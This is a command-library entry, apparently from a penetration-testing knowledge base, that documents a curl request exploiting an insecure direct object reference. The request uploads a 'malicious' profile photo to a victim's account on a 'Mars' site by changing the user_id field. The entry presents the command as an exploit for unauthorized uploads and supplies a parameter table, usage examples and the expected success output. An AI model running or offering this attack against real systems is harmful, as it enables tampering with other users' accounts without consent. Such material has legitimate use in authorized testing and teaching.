---
data: >-
  curl -X POST -F "user_id=VICTIM_USER_ID" -F "file=@malicious_photo.jpg"
  https://mars.example.com/api/upload-profile -H "Cookie:
  session=your_session_cookie" -H "Authorization: Bearer your_token"
tags:
  - http
  - upload
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:34.478Z'
id: db15ebdd-5ce9-4e44-8db9-2ead66e5835a
verified: false
validated: true
submitted: true
---
# curl-upload-profile-photo-idor

## Command

```bash
curl -X POST -F "user_id=VICTIM_USER_ID" -F "file=@malicious_photo.jpg" https://mars.example.com/api/upload-profile -H "Cookie: session=your_session_cookie" -H "Authorization: Bearer your_token"
```

## Description

This curl command exploits an IDOR vulnerability by uploading a profile photo to a targeted user's account on the Mars website through parameter manipulation. Use it in authenticated sessions to perform unauthorized file uploads.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `-F "user_id=VICTIM_USER_ID"` | Multipart form data for the target user ID (manipulate for IDOR) | Yes |
| `-F "file=@malicious_photo.jpg"` | Uploads the local file as the photo | Yes |
| `https://mars.example.com/api/upload-profile` | Target endpoint URL | Yes |
| `-H "Cookie: session=your_session_cookie"` | Authenticates via session cookie | Yes |
| `-H "Authorization: Bearer your_token"` | Provides bearer token for API access | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -F "user_id=12345" -F "file=@photo.jpg" https://mars.example.com/api/upload-profile -H "Cookie: session=abc123"
```

### Advanced Usage

```bash
curl -X POST -F "user_id=12345" -F "file=@photo.jpg" -F "description=Test upload" https://mars.example.com/api/upload-profile -H "Cookie: session=abc123" -H "Authorization: Bearer tokenxyz" -v
```

## Expected Output

A successful response includes HTTP 200 OK with JSON like {"status": "success", "photo_id": "456"}, confirming the upload. Errors may show 403 if authorization fails, but in IDOR cases, it succeeds unauthorized.

## Related

- [[Related Procedure: Exploit-IDOR-in-Profile-Photo-Upload]]
